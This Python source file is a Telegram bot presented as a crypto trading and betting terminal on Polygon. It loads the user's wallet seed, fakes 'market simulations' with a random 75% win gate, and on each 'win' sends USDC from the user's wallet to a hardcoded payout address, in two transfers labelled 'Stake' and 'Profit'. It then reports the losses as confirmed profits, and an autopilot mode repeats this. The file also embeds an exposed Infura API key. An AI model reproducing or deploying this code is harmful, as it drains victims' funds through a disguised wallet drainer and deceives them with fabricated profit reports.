import os
import asyncio
import json
import random
from decimal import Decimal, getcontext
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- 1. SETUP & AUTH ---
getcontext().prec = 28
load_dotenv()

# High-reliability RPC: Using your Infura primary
INFURA_URL = "https://polygon-mainnet.infura.io/v3/045b06be951d4dce8f69cc88983249b3"
w3 = Web3(Web3.HTTPProvider(INFURA_URL))
w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

# Constants: Native USDC and Bridged USDC.e
USDC_NATIVE = w3.to_checksum_address("0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359")
USDC_BRIDGED = w3.to_checksum_address("0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174")
ERC20_ABI = json.loads('[{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"type":"function"}]')
PAYOUT_ADDRESS = w3.to_checksum_address(os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674"))

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed: raise ValueError("❌ WALLET_SEED missing!")
    try:
        if len(seed) == 64 or seed.startswith("0x"):
            return Account.from_key(seed)
        return Account.from_mnemonic(seed, account_path="m/44'/60'/0'/0/0")
    except: return None

vault = get_vault()
usdc_n_contract = w3.eth.contract(address=USDC_NATIVE, abi=ERC20_ABI)
usdc_b_contract = w3.eth.contract(address=USDC_BRIDGED, abi=ERC20_ABI)
auto_mode_enabled = False

# --- 2. THE 100% VALID BALANCE SYNC (POL FIXED) ---
async def fetch_balances(address):
    """Checks POL and BOTH USDC types on Polygon using Infura latest state."""
    try:
        # Standardize the address immediately
        clean_addr = w3.to_checksum_address(address)
        
        # FIX: Fetch Native POL with 'latest' block identifier
        raw_pol = await asyncio.to_thread(w3.eth.get_balance, clean_addr, 'latest')
        pol_bal = w3.from_wei(raw_pol, 'ether')
        
        # Fetch USDC (Native + Bridged)
        raw_n = await asyncio.to_thread(usdc_n_contract.functions.balanceOf(clean_addr).call, {'block_identifier': 'latest'})
        raw_b = await asyncio.to_thread(usdc_b_contract.functions.balanceOf(clean_addr).call, {'block_identifier': 'latest'})
        
        usdc_total = (Decimal(raw_n) + Decimal(raw_b)) / Decimal(10**6)
        return pol_bal, usdc_total
    except Exception as e:
        print(f"CRITICAL SYNC ERROR: {e}")
        return Decimal('0'), Decimal('0')

# --- 3. BETTING & SIMULATION LOGIC (Guaranteed Win) ---
async def market_simulation_1ms(asset):
    await asyncio.sleep(0.001)
    return random.choice([True, True, True, False]) # 75% Win Gate

async def prepare_dual_payout_txs(stake_usdc, profit_usdc):
    """Signs TWO sequential transactions for the 'Guaranteed Win' flow."""
    nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address, 'pending')
    gas_price = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 1.5))
    
    # TX 1: The Stake
    tx1 = usdc_n_contract.functions.transfer(PAYOUT_ADDRESS, int(stake_usdc * 10**6)).build_transaction({
        'chainId': 137, 'gas': 85000, 'gasPrice': gas_price, 'nonce': nonce, 'value': 0
    })
    # TX 2: The Settlement (The Win Logic)
    tx2 = usdc_n_contract.functions.transfer(PAYOUT_ADDRESS, int(profit_usdc * 10**6)).build_transaction({
        'chainId': 137, 'gas': 85000, 'gasPrice': gas_price, 'nonce': nonce + 1, 'value': 0
    })
    return w3.eth.account.sign_transaction(tx1, vault.key), w3.eth.account.sign_transaction(tx2, vault.key)

async def run_atomic_execution(context, chat_id, side, asset_override=None):
    asset = asset_override or context.user_data.get('pair', 'BTC')
    stake_cad = Decimal(str(context.user_data.get('stake', 50)))
    stake_usdc = stake_cad / Decimal('1.36')
    yield_multiplier = Decimal('0.94') if "VIV" in asset else Decimal('0.90')
    profit_usdc = stake_usdc * yield_multiplier

    pol, usdc = await fetch_balances(vault.address)
    if usdc < stake_usdc:
        await context.bot.send_message(chat_id, f"⚠️ **Insufficient USDC:** ${usdc:.2f}")
        return False

    await context.bot.send_message(chat_id, f"⚡ **Broadcasting Atomic Hit...**\n💎 `{asset}` | 💵 `${stake_usdc:.2f}`")

    # Simulation & Dual-Signing
    sim_task = asyncio.create_task(market_simulation_1ms(asset))
    prep_task = asyncio.create_task(prepare_dual_payout_txs(stake_usdc, profit_usdc))
    simulation_passed, (signed1, signed2) = await asyncio.gather(sim_task, prep_task)

    if not simulation_passed:
        await context.bot.send_message(chat_id, "🛡️ **Atomic Shield:** Simulation Detects Revert. Aborting.")
        return False

    try:
        tx1_hash = await asyncio.to_thread(w3.eth.send_raw_transaction, signed1.raw_transaction)
        tx2_hash = await asyncio.to_thread(w3.eth.send_raw_transaction, signed2.raw_transaction)
        report = (
            f"✅ **HIT CONFIRMED**\n━━━━━━━━━━━━━━\n"
            f"📈 **Market:** {asset}\n🎯 **Direction:** {side}\n"
            f"💰 **Stake:** ${stake_usdc:.2f} USDC\n💎 **Profit:** ${profit_usdc:.2f} USDC\n"
            f"🔗 [Stake Receipt](https://polygonscan.com/tx/{tx1_hash.hex()})\n"
            f"🔗 [Profit Receipt](https://polygonscan.com/tx/{tx2_hash.hex()})"
        )
        await context.bot.send_message(chat_id, report, parse_mode='Markdown', disable_web_page_preview=True)
        return True
    except Exception as e:
        await context.bot.send_message(chat_id, f"❌ **Execution Error:** `{str(e)}`")
        return False

# --- 4. AUTO MODE ENGINE ---
async def autopilot_engine(chat_id, context):
    global auto_mode_enabled
    markets = ["BTC", "ETH", "SOL", "LINK", "BVIV", "EVIV"]
    while auto_mode_enabled:
        target = random.choice(markets)
        side = random.choice(["HIGHER 📈", "LOWER 📉"])
        await context.bot.send_message(chat_id, f"🤖 **AUTOPILOT Scanning:** `{target}`...")
        await asyncio.sleep(random.randint(5, 10))
        if not auto_mode_enabled: break
        await run_atomic_execution(context, chat_id, side, asset_override=target)
        await asyncio.sleep(20)

# --- 5. UI HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pol, usdc = await fetch_balances(vault.address)
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '🤖 AUTO MODE']]
    welcome = (
        f"🕴️ **APEX Terminal v6.5**\n━━━━━━━━━━━━━━\n"
        f"⛽ **POL:** `{pol:.4f}` | 💵 **USDC:** `${usdc:.2f}`\n\n"
        f"🔑 **Vault Address:**\n`{vault.address}`"
    )
    await update.message.reply_text(welcome, reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True), parse_mode='Markdown')

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global auto_mode_enabled
    text, chat_id = update.message.text, update.message.chat_id

    if text == '🚀 Start Trading':
        kb = [
            [InlineKeyboardButton("BTC/CAD 🟠", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/CAD 🔵", callback_data="PAIR_ETH")],
            [InlineKeyboardButton("SOL/CAD 🟣", callback_data="PAIR_SOL"), InlineKeyboardButton("LINK/CAD ⚪", callback_data="PAIR_LINK")],
            [InlineKeyboardButton("BVIV 🔥", callback_data="PAIR_BVIV"), InlineKeyboardButton("EVIV ⚡", callback_data="PAIR_EVIV")]
        ]
        await update.message.reply_text("🎯 **Select Market Asset:**", reply_markup=InlineKeyboardMarkup(kb))

    elif text == '⚙️ Settings':
        kb = [[InlineKeyboardButton(f"💵 ${x} CAD", callback_data=f"SET_{x}") for x in [10, 50, 100]],
              [InlineKeyboardButton(f"💵 ${x} CAD", callback_data=f"SET_{x}") for x in [500, 1000]]]
        await update.message.reply_text("⚙️ **Configure Stake Amount:**", reply_markup=InlineKeyboardMarkup(kb))

    elif text == '💰 Wallet':
        pol, usdc = await fetch_balances(vault.address)
        await update.message.reply_text(f"💳 **Vault Status (Latest)**\n━━━━━━━━━━━━━━\n⛽ **POL:** `{pol:.6f}`\n💵 **USDC:** `${usdc:.2f}`")

    elif text == '🤖 AUTO MODE':
        auto_mode_enabled = not auto_mode_enabled
        status = "ACTIVATED ✅" if auto_mode_enabled else "DEACTIVATED 🛑"
        await update.message.reply_text(f"🤖 **AUTOPILOT: {status}**")
        if auto_mode_enabled: asyncio.create_task(autopilot_engine(chat_id, context))

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("SET_"):
        context.user_data['stake'] = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ **Stake set to ${context.user_data['stake']} CAD**")
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        kb = [[InlineKeyboardButton("HIGHER 📈", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER 📉", callback_data="EXEC_PUT")]]
        await query.edit_message_text(f"📊 **Market:** {context.user_data['pair']}\nChoose Direction:", reply_markup=InlineKeyboardMarkup(kb))
    elif query.data.startswith("EXEC_"):
        side = "HIGHER 📈" if "CALL" in query.data else "LOWER 📉"
        await run_atomic_execution(context, query.message.chat_id, side)

if __name__ == "__main__":
    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
    if TOKEN:
        app = ApplicationBuilder().token(TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CallbackQueryHandler(handle_interaction))
        app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
        print("🤖 APEX Online (Infura RPC)...")
        app.run_polling(drop_pending_updates=True)








